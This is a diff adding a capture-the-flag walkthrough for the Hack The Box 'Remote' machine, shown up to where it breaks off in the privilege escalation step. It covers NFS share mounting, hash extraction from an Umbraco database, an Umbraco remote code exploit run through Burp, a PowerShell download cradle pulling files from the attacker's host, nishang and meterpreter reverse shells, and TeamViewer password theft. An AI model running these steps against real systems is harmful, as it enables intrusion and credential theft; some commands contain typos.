@@ -1,0 +1,31 @@
+Remote.180
+
+Step 1 (Scanning)
+- Target was scanned, restarted ad rescanned using nmap
+
+Step 2 (Enumeration)
+- Target has port 80 (HTTP) and port 111 (rpcbind)
+- Using the command ‘show mount -e 10.10.10.180’ shows the nfs share site_backups
+- From here we will make a new directory to mount the NFS share using the command ‘mkdir /tmp/remote’
+- Using ‘sudo mount -t nfs 10.10.10.180:/site_backups /tmp/remote’ will mount the nfs share to our device
+- Once the shares are mounted we will go into the App_Data directory and read the database by using ‘strings Umbraco.sdf’
+- From here we will get the hash and email address of the admin user and decode the hash with SHA1
+
+Step 3 (Gaining access)
+- With the credentials we were given we will login to the umbraco webpage as admin
+- Using searchsploit on the the umbrage version we get a python exploit which launches calculator on launch
+- Running the exploit out of the box won’t work, from here we open the exploit and manually run it
+- We login to the webpage, navigate to the subdirectory specified in the exploit, capture a request by pressing the button on the webpage and use burps repeater to run the payload
+- The payload will run a calculator on the target host, from here change the command used and change the argument to run a powershell script which will download and run the program specified
+- Running a direct reverse shell will cause it to time out when the webpage logs out, to counteract this we will link it to download and run a nishang reverse powershell connection upon success.
+
+Step 4 (Enumeration)
+- Using the syntax ‘IEX(Net-Object System.Net.WebClient).DownloadFile(“http://<our ip>:<port>/<file>”, “<output file name>”) we download files using powershell and run .exe files with ‘./‘ similar to *nix
+- Running the winpeas enumerator we find there is an active TeamViewer session available.
+- Using msfvenom we make a .exe reverse meterpreter shell and upload with powershell and run.
+- With msfconsole we use the teamviewer_password module and link it to our meterpreter session.
+- From here we have the password for the admin user.
+
+Step 5 (Priviledge escalation)
+- With the password we use smbclient to access the admin drives and use the syntax ‘smbclient //10.10.10.180/C$ -m SMB2 -U Administrator’ and type the password we retrieved.
+- Navigate to the 
